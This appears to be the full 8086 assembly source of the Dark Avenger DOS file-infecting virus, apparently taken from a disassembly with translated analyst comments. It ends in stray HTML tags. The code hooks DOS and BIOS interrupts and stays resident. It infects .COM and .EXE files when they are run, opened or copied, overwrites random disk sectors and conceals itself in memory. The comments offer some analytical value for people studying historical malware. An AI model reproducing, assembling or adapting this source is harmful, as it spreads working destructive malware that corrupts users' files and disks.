        mov     word ptr cs:[si+fdisk+2],es
        mov     word ptr cs:[si+disk],ax        ;and here. These are defaults.
        mov     word ptr cs:[si+disk+2],es
        mov     ax,ds:[40h*4+2]         ;The INT 13h vector is moved to INT 40h
        cmp     ax,0f000h               ;for diskettes if a hard disk is
        jne     nofdisk                 ;available
        mov     word ptr cs:[si+disk+2],ax      ;put 40H vector here if there
        mov     ax,ds:[40h*4]                   ;is a valid one
        mov     word ptr cs:[si+disk],ax
        mov     dl,80h                  ;default size for F000 segment
        mov     ax,ds:[41h*4+2]         ;INT 41h usually points the segment,
        cmp     ax,0f000h               ;where the original INT 13h vector is
        je      isfdisk                 ;seg=F000, continue
        cmp     ah,0c8h
        jc      nofdisk                 ;seg<C800, assume  no disk
        cmp     ah,0f4h
        jnc     nofdisk                 ;seg>=f400, assume no disk
        test    al,7fh
        jnz     nofdisk
        mov     ds,ax
        cmp     ds:[0],0aa55h           ;check seg to see if BIOS ROM extension
        jne     nofdisk
        mov     dl,ds:[2]               ;get ROM size
isfdisk:
        mov     ds,ax
        xor     dh,dh
        mov     cl,9
        shl     dx,cl
        mov     cx,dx                   ;cx=seg size, in bytes
        xor     si,si                   ;prep to scan
findvect:
        lodsw                           ;Occasionally begins with:
        cmp     ax,0fa80h               ;       CMP     DL,80h
        jne     altchk                  ;       JNC     somewhere
        lodsw
        cmp     ax,7380h
        je      intchk
        jne     nxt0
altchk:
        cmp     ax,0c2f6h               ;or with:
        jne     nxt                     ;       TEST    DL,80h
        lodsw                           ;       JNZ     somewhere
        cmp     ax,7580h
        jne     nxt0
intchk:
        inc     si                      ;then there is:
        lodsw                           ;       INT     40h
        cmp     ax,40cdh
        je      found
        sub     si,3
nxt0:
        dec     si
        dec     si
nxt:
        dec     si
        loop    findvect
        jmp     short nofdisk
found:
        sub     si,7
        mov     word ptr cs:[di+fdisk],si       ;save orig vector here
        mov     word ptr cs:[di+fdisk+2],ds
nofdisk:
        mov     si,di
        pop     ds

; Check whether the program is present in memory:

        les     ax,ds:[21h*4]
        mov     word ptr cs:[si+save_int_21],ax
        mov     word ptr cs:[si+save_int_21+2],es
        push    cs
        pop     ds
        cmp     ax,offset int_21
        jne     bad_func
        xor     di,di
        mov     cx,offset my_size
scan_func:
        lodsb
        scasb
        jne     bad_func
        loop    scan_func
        pop     es
        jmp     go_program

; Move the program to the top of memory:
; (it's full of rubbish and bugs here)

bad_func:
        pop     es
        mov     ah,49h
        int     21h
        mov     bx,0ffffh
        mov     ah,48h
        int     21h
        sub     bx,(top_bz+my_bz+1ch-1)/16+2
        jc      go_program
        mov     cx,es
        stc
        adc     cx,bx
        mov     ah,4ah
        int     21h
        mov     bx,(offset top_bz+offset my_bz+1ch-1)/16+1
        stc
        sbb     es:[2],bx
        push    es
        mov     es,cx
        mov     ah,4ah
        int     21h
        mov     ax,es
        dec     ax
        mov     ds,ax
        mov     word ptr ds:[1],8
        call    mul_16
        mov     bx,ax
        mov     cx,dx
        pop     ds
        mov     ax,ds
        call    mul_16
        add     ax,ds:[6]
        adc     dx,0
        sub     ax,bx
        sbb     dx,cx
        jc      mem_ok
        sub     ds:[6],ax               ;Reduction of the segment size
mem_ok:
        pop     si
        push    si
        push    ds
        push    cs
        xor     di,di
        mov     ds,di
        lds     ax,ds:[27h*4]
        mov     word ptr cs:[si+save_int_27],ax
        mov     word ptr cs:[si+save_int_27+2],ds
        pop     ds
        mov     cx,offset aux_size
        rep     movsb
        xor     ax,ax
        mov     ds,ax
        mov     ds:[21h*4],offset int_21;Intercept INT 21h and INT 27h
        mov     ds:[21h*4+2],es
        mov     ds:[27h*4],offset int_27
        mov     ds:[27h*4+2],es
        mov     word ptr es:[filehndl],ax
        pop     es
go_program:
        pop     si

; Smash the next disk sector:

        xor     ax,ax
        mov     ds,ax
        mov     ax,ds:[13h*4]
        mov     word ptr cs:[si+save_int_13],ax
        mov     ax,ds:[13h*4+2]
        mov     word ptr cs:[si+save_int_13+2],ax
        mov     ds:[13h*4],offset int_13
        add     ds:[13h*4],si
        mov     ds:[13h*4+2],cs
        pop     ds
        push    ds
        push    si
        mov     bx,si
        lds     ax,ds:[2ah]
        xor     si,si
        mov     dx,si
scan_envir:                             ;Fetch program's name
        lodsw                           ;(with DOS 2.x it doesn't work anyway)
        dec     si
        test    ax,ax
        jnz     scan_envir
        add     si,3
        lodsb

; The following instruction is a complete nonsense.  Try to enter a drive &
; directory path in lowercase, then run an infected program from there.
; As a result of an error here + an error in DOS the next sector is not
; smashed. Two memory bytes are smashed instead, most probably onto the
; infected program.

        sub     al,'A'
        mov     cx,1
        push    cs
        pop     ds
        add     bx,offset int_27
        push    ax
        push    bx
        push    cx
        int     25h
        pop     ax
        pop     cx
        pop     bx
        inc     byte ptr [bx+0ah]
        and     byte ptr [bx+0ah],0fh   ;It seems that 15 times doing
        jnz     store_sec               ;nothing is not enough for some.
        mov     al,[bx+10h]
        xor     ah,ah
        mul     word ptr [bx+16h]
        add     ax,[bx+0eh]
        push    ax
        mov     ax,[bx+11h]
        mov     dx,32
        mul     dx
        div     word ptr [bx+0bh]
        pop     dx
        add     dx,ax
        mov     ax,[bx+8]
        add     ax,40h
        cmp     ax,[bx+13h]
        jc      store_new
        inc     ax
        and     ax,3fh
        add     ax,dx
        cmp     ax,[bx+13h]
        jnc     small_disk
store_new:
        mov     [bx+8],ax
store_sec:
        pop     ax
        xor     dx,dx
        push    ax
        push    bx
        push    cx
        int     26h


; The writing trough this interrupt is not the smartest thing, bacause it
; can be intercepted (what Vesselin Bontchev has managed to notice).

        pop     ax
        pop     cx
        pop     bx
        pop     ax
        cmp     byte ptr [bx+0ah],0
        jne     not_now
        mov     dx,[bx+8]
        pop     bx
        push    bx
        int     26h
small_disk:
        pop     ax
not_now:
        pop     si
        xor     ax,ax
        mov     ds,ax
        mov     ax,word ptr cs:[si+save_int_13]
        mov     ds:[13h*4],ax
        mov     ax,word ptr cs:[si+save_int_13+2]
        mov     ds:[13h*4+2],ax
        pop     ds
        pop     ax
        cmp     word ptr cs:[si+my_save],5a4dh
        jne     go_exit_com
        jmp     exit_exe
go_exit_com:
        jmp     exit_com
int_24:
        mov     al,3                    ;This instruction seems unnecessary
        iret

; INT 27h handler (this is necessary)

int_27:
        pushf
        call    alloc
        popf
        jmp     dword ptr cs:[save_int_27]

; During the DOS functions Set & Get Vector it seems that the virus has not
; intercepted them (this is a doubtfull advantage and it is a possible
; source of errors with some "intelligent" programs)

set_int_27:
        mov     word ptr cs:[save_int_27],dx
        mov     word ptr cs:[save_int_27+2],ds
        popf
        iret
set_int_21:
        mov     word ptr cs:[save_int_21],dx
        mov     word ptr cs:[save_int_21+2],ds
        popf
        iret
get_int_27:
        les     bx,dword ptr cs:[save_int_27]
        popf
        iret
get_int_21:
        les     bx,dword ptr cs:[save_int_21]
        popf
        iret

exec:


        call    do_file
        call    alloc
        popf
        jmp     dword ptr cs:[save_int_21]

        db      'Diana P.',0

; INT 21h handler.  Infects files during execution, copying, browsing or
; creating and some other operations. The execution of functions 0 and 26h
; has bad consequences.

int_21:
        push    bp
        mov     bp,sp
        push    [bp+6]
        popf
        pop     bp
        pushf
        call    ontop
        cmp     ax,2521h
        je      set_int_21
        cmp     ax,2527h
        je      set_int_27
        cmp     ax,3521h
        je      get_int_21
        cmp     ax,3527h
        je      get_int_27
        cld
        cmp     ax,4b00h
        je      exec
        cmp     ah,3ch
        je      create
        cmp     ah,3eh
        je      close
        cmp     ah,5bh
        jne     not_create
create:
        cmp     word ptr cs:[filehndl],0;May be 0 if the file is open
        jne     dont_touch
        call    see_name
        jnz     dont_touch
        call    alloc
        popf
        call    function
        jc      int_exit
        pushf
        push    es
        push    cs
        pop     es
        push    si
        push    di
        push    cx
        push    ax
        mov     di,offset filehndl
        stosw
        mov     si,dx
        mov     cx,65
move_name:
        lodsb
        stosb
        test    al,al
        jz      all_ok
        loop    move_name
        mov     word ptr es:[filehndl],cx
all_ok:
        pop     ax
        pop     cx
        pop     di
        pop     si
        pop     es
go_exit:
        popf
        jnc     int_exit                ;JMP
close:
        cmp     bx,word ptr cs:[filehndl]
        jne     dont_touch
        test    bx,bx
        jz      dont_touch
        call    alloc
        popf
        call    function
        jc      int_exit
        pushf
        push    ds
        push    cs
        pop     ds
        push    dx
        mov     dx,offset filehndl+2
        call    do_file
        mov     word ptr cs:[filehndl],0
        pop     dx
        pop     ds
        jmp     go_exit
not_create:
        cmp     ah,3dh
        je      touch
        cmp     ah,43h
        je      touch
        cmp     ah,56h                  ;Unfortunately, the command inter-
        jne     dont_touch              ;preter does not use this function
touch:
        call    see_name
        jnz     dont_touch
        call    do_file
dont_touch:
        call    alloc
        popf
        call    function
int_exit:
        pushf
        push    ds
        call    get_chain
        mov     byte ptr ds:[0],'Z'
        pop     ds
        popf
dummy   proc    far                     ;???
        ret     2
dummy   endp

; Checks whether the file is .COM or .EXE.
; It is not called upon file execution.

see_name:
        push    ax
        push    si
        mov     si,dx
scan_name:
        lodsb
        test    al,al
        jz      bad_name
        cmp     al,'.'
        jnz     scan_name
        call    get_byte
        mov     ah,al
        call    get_byte
        cmp     ax,'co'
        jz      pos_com
        cmp     ax,'ex'
        jnz     good_name
        call    get_byte
        cmp     al,'e'
        jmp     short good_name
pos_com:
        call    get_byte
        cmp     al,'m'
        jmp     short good_name
bad_name:
        inc     al
good_name:
        pop     si
        pop     ax
        ret

; Converts into lowercase (the subroutines are a great thing).

get_byte:
        lodsb
        cmp     al,'C'
        jc      byte_got
        cmp     al,'Y'
        jnc     byte_got
        add     al,20h
byte_got:
        ret

; Calls the original INT 21h.

function:
        pushf
        call    dword ptr cs:[save_int_21]
        ret

; Arrange to infect an executable file.

do_file:
        push    ds                      ;Save the registers in stack
        push    es
        push    si
        push    di
        push    ax
        push    bx
        push    cx
        push    dx
        mov     si,ds
        xor     ax,ax
        mov     ds,ax
        les     ax,ds:[24h*4]           ;Saves INT 13h and INT 24h in stack
        push    es                      ;and changes them with what is needed
        push    ax
        mov     ds:[24h*4],offset int_24
        mov     ds:[24h*4+2],cs
        les     ax,ds:[13h*4]
        mov     word ptr cs:[save_int_13],ax
        mov     word ptr cs:[save_int_13+2],es
        mov     ds:[13h*4],offset int_13
        mov     ds:[13h*4+2],cs
        push    es
        push    ax
        mov     ds,si
        xor     cx,cx                   ;Arranges to infect Read-only files
        mov     ax,4300h
        call    function
        mov     bx,cx
        and     cl,0feh
        cmp     cl,bl
        je      dont_change
        mov     ax,4301h
        call    function
        stc
dont_change:
        pushf
        push    ds
        push    dx
        push    bx
        mov     ax,3d02h                ;Now we can safely open the file
        call    function
        jc      cant_open
        mov     bx,ax
        call    disease
        mov     ah,3eh                  ;Close it

        call    function
cant_open:
        pop     cx
        pop     dx
        pop     ds
        popf
        jnc     no_update
        mov     ax,4301h                ;Restores file's attributes
        call    function                ;if they were changed (just in case)
no_update:
        xor     ax,ax                   ;Restores INT 13h and INT 24h
        mov     ds,ax
        pop     ds:[13h*4]
        pop     ds:[13h*4+2]
        pop     ds:[24h*4]
        pop     ds:[24h*4+2]
        pop     dx                      ;Register restoration
        pop     cx
        pop     bx
        pop     ax
        pop     di
        pop     si
        pop     es
        pop     ds
        ret

; This routine is the working horse.

disease:
        push    cs
        pop     ds
        push    cs
        pop     es
        mov     dx,offset top_save      ;Read the file beginning
        mov     cx,18h
        mov     ah,3fh
        int     21h
        xor     cx,cx
        xor     dx,dx
        mov     ax,4202h                ;Save file length
        int     21h
        mov     word ptr [top_save+1ah],dx
        cmp     ax,offset my_size       ;This should be top_file
        sbb     dx,0
        jc      stop_kill_2             ;Small files are not infected
        mov     word ptr [top_save+18h],ax
        cmp     word ptr [top_save],5a4dh
        jne     com_file
        mov     ax,word ptr [top_save+8]
        add     ax,word ptr [top_save+16h]
        call    mul_16
        add     ax,word ptr [top_save+14h]
        adc     dx,0
        mov     cx,dx
        mov     dx,ax
        jmp     short see_sick
com_file:
        cmp     byte ptr [top_save],0e9h
        jne     see_kill
        mov     dx,word ptr [top_save+1]
        add     dx,103h
        jc      see_kill
        dec     dh
        xor     cx,cx

; Check if the file is properly infected


see_sick:
        sub     dx,startup-copyright
        sbb     cx,0
        mov     ax,4200h
        int     21h
        add     ax,offset top_file
        adc     dx,0
        cmp     ax,word ptr [top_save+18h]
        jne     see_kill
        cmp     dx,word ptr [top_save+1ah]
        jne     see_kill
        mov     dx,offset top_save+1ch
        mov     si,dx
        mov     cx,offset my_size
        mov     ah,3fh
        int     21h
        jc      see_kill
        cmp     cx,ax
        jne     see_kill
        xor     di,di
next_byte:

        lodsb
        scasb
        jne     see_kill
        loop    next_byte
stop_kill_2:
        ret
see_kill:
        xor     cx,cx                   ;Seek to the end of file
        xor     dx,dx
        mov     ax,4202h
        int     21h
        cmp     word ptr [top_save],5a4dh
        je      kill_exe
        add     ax,offset aux_size+200h ;Watch out for too big .COM files
        adc     dx,0
        je      kill_it
        ret

; Pad .EXE files to paragraph boundary. This is absolutely unnecessary.

kill_exe:
        mov     dx,word ptr [top_save+18h]
        neg     dl
        and     dx,0fh
        xor     cx,cx
        mov     ax,4201h
        int     21h
        mov     word ptr [top_save+18h],ax
        mov     word ptr [top_save+1ah],dx
kill_it:
        mov     ax,5700h                ;Get file's date
        int     21h
        pushf
        push    cx
        push    dx
        cmp     word ptr [top_save],5a4dh
        je      exe_file                ;Very clever, isn't it?
        mov     ax,100h
        jmp     short set_adr
exe_file:
        mov     ax,word ptr [top_save+14h]
        mov     dx,word ptr [top_save+16h]
set_adr:
        mov     di,offset call_adr
        stosw
        mov     ax,dx
        stosw
        mov     ax,word ptr [top_save+10h]
        stosw
        mov     ax,word ptr [top_save+0eh]
        stosw
        mov     si,offset top_save      ;This offers the possibilities to
        movsb                           ;some nasty programs to restore
        movsw                           ;exactly the original length
        xor     dx,dx                   ;of the .EXE files
        mov     cx,offset top_file
        mov     ah,40h
        int     21h                     ;Write the virus
        jc      go_no_kill              ;(don't trace here)
        xor     cx,ax
        jnz     go_no_kill
        mov     dx,cx
        mov     ax,4200h
        int     21h
        cmp     word ptr [top_save],5a4dh
        je      do_exe
        mov     byte ptr [top_save],0e9h
        mov     ax,word ptr [top_save+18h]
        add     ax,startup-copyright-3
        mov     word ptr [top_save+1],ax
        mov     cx,3
        jmp     short write_header
go_no_kill:
        jmp     short no_kill

; Construct the .EXE file's header

do_exe:
        call    mul_hdr
        not     ax
        not     dx
        inc     ax
        jne     calc_offs
        inc     dx
calc_offs:
        add     ax,word ptr [top_save+18h]
        adc     dx,word ptr [top_save+1ah]
        mov     cx,10h
        div     cx
        mov     word ptr [top_save+14h],startup-copyright
        mov     word ptr [top_save+16h],ax
        add     ax,(offset top_file-offset copyright-1)/16+1
        mov     word ptr [top_save+0eh],ax
        mov     word ptr [top_save+10h],100h
        add     word ptr [top_save+18h],offset top_file
        adc     word ptr [top_save+1ah],0
        mov     ax,word ptr [top_save+18h]
        and     ax,1ffh
        mov     word ptr [top_save+2],ax
        pushf
        mov     ax,word ptr [top_save+19h]
        shr     byte ptr [top_save+1bh],1
        rcr     ax,1
        popf
        jz      update_len
        inc     ax
update_len:
        mov     word ptr [top_save+4],ax
        mov     cx,18h
write_header:
        mov     dx,offset top_save
        mov     ah,40h
        int     21h                     ;Write the file beginning
no_kill:
        pop     dx
        pop     cx
        popf
        jc      stop_kill
        mov     ax,5701h                ;Restore the original file date
        int     21h
stop_kill:
        ret

; The following is used by the INT 21h and INT 27h handlers in connection
; to the program hiding in memory from those who don't need to see it.
; The whole system is absurde and meaningless and it is also another source
; for program conflicts.

alloc:
        push    ds
        call    get_chain
        mov     byte ptr ds:[0],'M'
        pop     ds

; Assures that the program is the first one in the processes,
; which have intercepted INT 21h (yet another source of conflicts).

ontop:
        push    ds
        push    ax
        push    bx
        push    dx
        xor     bx,bx
        mov     ds,bx
        lds     dx,ds:[21h*4]
        cmp     dx,offset int_21
        jne     search_segment
        mov     ax,ds
        mov     bx,cs
        cmp     ax,bx
        je      test_complete

; Searches the segment of the sucker who has intercepted INT 21h, in
; order to find where it has stored the old values and to replace them.
; Nothing is done for INT 27h.

        xor     bx,bx
search_segment:
        mov     ax,[bx]
        cmp     ax,offset int_21
        jne     search_next
        mov     ax,cs
        cmp     ax,[bx+2]
        je      got_him
search_next:
        inc     bx
        jne     search_segment
        je      return_control
got_him:
        mov     ax,word ptr cs:[save_int_21]
        mov     [bx],ax
        mov     ax,word ptr cs:[save_int_21+2]
        mov     [bx+2],ax
        mov     word ptr cs:[save_int_21],dx
        mov     word ptr cs:[save_int_21+2],ds
        xor     bx,bx

; Even if he has not saved them in the same segment, this won't help him.

return_control:
        mov     ds,bx
        mov     ds:[21h*4],offset int_21
        mov     ds:[21h*4+2],cs
test_complete:
        pop     dx
        pop     bx
        pop     ax
        pop     ds
        ret

; Fetch the segment of the last MCB

get_chain:
        push    ax
        push    bx
        mov     ah,62h
        call    function
        mov     ax,cs
        dec     ax
        dec     bx
next_blk:
        mov     ds,bx
        stc
        adc     bx,ds:[3]
        cmp     bx,ax
        jc      next_blk
        pop     bx
        pop     ax
        ret

; Multiply by 16

mul_hdr:
        mov     ax,word ptr [top_save+8]
mul_16:
        mov     dx,10h
        mul     dx
        ret

        db      'This program was written in the city of Sofia '
        db      '(C) 1988-89 Dark Avenger',0

; INT 13h handler.
; Calls the original vectors in BIOS, if it's a writing call

int_13:
        cmp     ah,3
        jnz     subfn_ok
        cmp     dl,80h
        jnc     hdisk
        db      0eah                    ;JMP XXXX:YYYY
my_size:                                ;--- Up to here comparison
disk:                                   ; with the original is made
        dd      0
hdisk:
        db      0eah                    ;JMP XXXX:YYYY
fdisk:
        dd      0
subfn_ok:
        db      0eah                    ;JMP XXXX:YYYY
save_int_13:
        dd      0
call_adr:
        dd      100h

stack_pointer:
        dd      0                       ;The original value of SS:SP
my_save:
        int     20h                     ;The original contents of the first
        nop                             ;3 bytes of the file
top_file:                               ;--- Up to here the code is written
filehndl    equ $                       ; in the files
filename    equ filehndl+2              ;Buffer for the name of the opened file
save_int_27 equ filename+65             ;Original INT 27h vector
save_int_21 equ save_int_27+4           ;Original INT 21h vector
aux_size    equ save_int_21+4           ;--- Up to here is moved into memory
top_save    equ save_int_21+4           ;Beginning of the buffer, which contains
                                        ; - The first 24 bytes read from file
                                        ; - File length (4 bytes)
                                        ; - The last bytes of the file
                                        ;   (my_size bytes)
top_bz      equ top_save-copyright
my_bz       equ my_size-copyright

code    ends

        end

</textarea></td></tr></table></body></html>
